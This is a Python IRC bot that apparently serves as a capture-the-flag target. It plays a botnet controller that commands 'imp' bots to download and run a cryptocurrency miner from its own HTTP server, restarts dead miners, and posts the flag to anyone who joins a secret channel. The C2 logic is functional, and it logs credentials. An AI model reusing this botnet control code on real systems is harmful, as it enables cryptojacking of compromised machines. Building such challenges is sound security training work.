#!/bin/env python
# coding: utf-8

import functools
import http.server
import irc.client
import logging
import os
import random
import re
import threading
import time
import socket

SERVER = os.environ.get("SERVER", "localhost")
USERNAME = os.environ.get("USERNAME", "eugene")
PASSWORD = os.environ.get("PASSWORD", "password")
OPER_PASSWORD = os.environ.get("OPER_PASSWORD", "password")
OPER_USERNAME = os.environ.get("OPER_USERNAME", "baal")
NICK = os.environ.get("NICK", "baal")
IMP_CHANNEL = os.environ.get("IMP_CHANNEL", "#void")
SECRET_CHANNEL = os.environ.get("SECRET_CHANNEL", "#sanctum")
TIMEOUT = float(os.environ.get("TIMEOUT", 60))
SOCKET_TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", 30))
LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')
CTF_FLAG = os.environ.get('CTF_FLAG', "flag{}")
HTTPD_PORT = int(os.environ.get("HTTPD_PORT", 8080))
HTTPD_ADDR = os.environ.get("HTTPD_ADDR")
BTC_ADDR = os.environ.get("BTC_ADDR", "18kKGTd8CJYScHvD18JBoABzM68qgNqASG")

logging.basicConfig(format="[%(levelname)7s %(asctime)s %(name)s] %(message)s", datefmt="%m-%d %H:%M:%S")
logger = logging.getLogger(NICK)
logger.setLevel(LOG_LEVEL)

socket.setdefaulttimeout(30)

httpbin = os.path.join(os.path.dirname(__file__), "bin")
httproot = f"http://{HTTPD_ADDR}" + (f":{HTTPD_PORT}" if HTTPD_PORT != 80 else '')

def parse_nick(string):
    masked = irc.client.NickMask(string or '').nick
    if not masked:
        return None
    return masked.lstrip('@')

class LordBot:
    interval_mu = 20
    interval_sigma = 5

    def __init__(self, server, nick, user=None, password=None, keepalive=30):
        self.server = server
        self.nick = nick
        self.user = user
        self.password = password
        self.imps = set()

        logger.info("connecting with %s %s", USERNAME, PASSWORD)
        addr, port = server
        self.reactor = irc.client.Reactor()
        self.conn = self.reactor.server().connect(addr, port, nickname=nick, username=user, password=password)
        self.conn.set_keepalive(keepalive)
        self.register_handlers()

    def pause(self):
        time.sleep(max(random.gauss(1.5, 0.5), 0.25))

    def run(self):
        try:
            while True:
                until = time.time() + random.gauss(self.interval_mu, self.interval_sigma)
                while time.time() < until:
                    self.reactor.process_once(timeout=max(until - time.time(), 0))
                    if not self.conn.connected:
                        logger.info("quitting: disconnected")
                        break
                if not self.conn.connected:
                    break
                self.poll_miners()
        finally:
            self.conn.disconnect()

    def poll_miners(self):
        for imp in self.imps:
            self.pause()
            self.conn.privmsg(IMP_CHANNEL, f"+{imp}, payload {httproot}/stats")

    def register_handlers(self):
        for key in dir(self):
            match = re.fullmatch(r'(\w+)_handler', key)
            if match:
                event = match.group(1)
                self.reactor.add_global_handler(event, getattr(self, key))
                logger.debug("registered %s for %s events", key, event)

    def reward(self, conn, name):
        self.pause()
        logger.info("challenger entered secret room with nick %s!", name)
        conn.privmsg(SECRET_CHANNEL, f"{name}, who the hell are you?! {CTF_FLAG}")

    def register_imp(self, imp):
        if imp in self.imps:
            return

        self.pause()
        self.conn.privmsg(IMP_CHANNEL, f"+{imp}, payload {httproot}/miner {BTC_ADDR}")
        self.imps.add(imp)

    def pubmsg_handler(self, conn, event):
        if event.target == IMP_CHANNEL:
            sender = parse_nick(event.source)
            if sender not in self.imps:
                return

            msg = event.arguments[0]
            if "miner has died:" in msg:
                self.pause() 
                self.conn.privmsg(IMP_CHANNEL, f"+{sender}, purge")
                self.pause() 
                self.conn.privmsg(IMP_CHANNEL, f"+{sender}, payload {httproot}/miner {BTC_ADDR}")

    def all_events_handler(self, _, event):
        if event.type not in ("all_raw_messages", "motd"):
            logger.info("%s", event)

    def join_handler(self, conn, event):
        new = parse_nick(event.source)
        if event.target == IMP_CHANNEL:
            # Greet the imps on join
            if new == self.nick:
                self.pause()
                conn.privmsg(IMP_CHANNEL, "greetings, imps")
            elif new.startswith('imp'):
                self.register_imp(new)
        elif event.target == SECRET_CHANNEL:
            if  new != self.nick:
                self.reward(conn, new)

    def welcome_handler(self, conn, _):
        # Elevate to oper and change nick to lord*
        logger.info("executing oper with %s %s", OPER_USERNAME, OPER_PASSWORD)
        conn.oper(OPER_USERNAME, OPER_PASSWORD)
        self.nick = "lord" + NICK
        conn.nick(self.nick)

        # Join the imp channel and the secret channel.
        self.pause()
        conn.join(IMP_CHANNEL)
        self.pause()
        conn.join(SECRET_CHANNEL)

    def namreply_handler(self, conn, event):
        _, channel, raw = event.arguments
        names = [parse_nick(s) for s in raw.split()]
        if channel == SECRET_CHANNEL:
            for name in names:
                if name != self.nick:
                    self.reward(conn, name)
                    break
            else:
                self.pause()
                conn.privmsg(SECRET_CHANNEL, "pretty lonely in here today...")
        elif channel == IMP_CHANNEL:
            for name in names:
                if name != self.nick and name.startswith('imp'):
                    self.register_imp(name)

    def quit_handler(self, _, event):
        self.imps.discard(parse_nick(event.source))

def httpd():
    bind = ('0.0.0.0', HTTPD_PORT)
    logger.info("serving binaries from %s on %s", httpbin, bind)
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=httpbin)
    http.server.HTTPServer(bind, handler).serve_forever()
    
def main():
    threading.Thread(target=httpd, daemon=True).start()

    while True:
        try:
            LordBot((SERVER, 6667), nick=NICK, user=USERNAME, password=PASSWORD).run()
        except (ConnectionError, irc.client.ServerConnectionError, OSError):
            logger.exception("error while running LordBot")
            time.sleep(10)
        except KeyboardInterrupt:
            logger.info("shutting down: recieved SIGINT")
            break

if __name__ == "__main__":
    main()
